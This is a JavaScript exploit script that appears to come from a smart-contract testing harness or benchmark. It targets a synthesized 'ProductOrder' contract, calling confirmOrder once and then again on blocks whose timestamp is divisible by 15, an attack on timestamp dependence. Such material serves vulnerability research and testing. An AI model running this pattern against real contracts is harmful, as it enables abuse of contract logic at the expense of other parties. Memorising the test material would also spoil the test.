require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
let logger = require('@lib/logging/logger');



const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-17.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        console.log("Attempting to confirm order multiple times...");

        // Confirm the order the first time
        await contractInstance.methods.confirmOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000
        });

        // Monitor the blockchain to execute confirmOrder again under the specific timing condition
        web3.eth.subscribe('newBlockHeaders', async (error, result) => {
            if (!error && result.timestamp % 15 === 0) {  // Check for the specific time condition
                try {
                    let receipt = await contractInstance.methods.confirmOrder().send({
                        from: web3.eth.accounts.wallet[0].address,
                        gas: 3000000
                    });

                    if (receipt.status) {
                        console.log(`Order confirmed again at specific timestamp: ${result.timestamp}`);
                        process.exit(0); // Exit after successful re-confirmation
                    }
                } catch (err) {
                    console.error("Attempt failed, will try again:", err.message);
                }
            }
        });
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        return false;
    }
}



module.exports = async function runTests(web3, envInfo, contractAddress) {
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
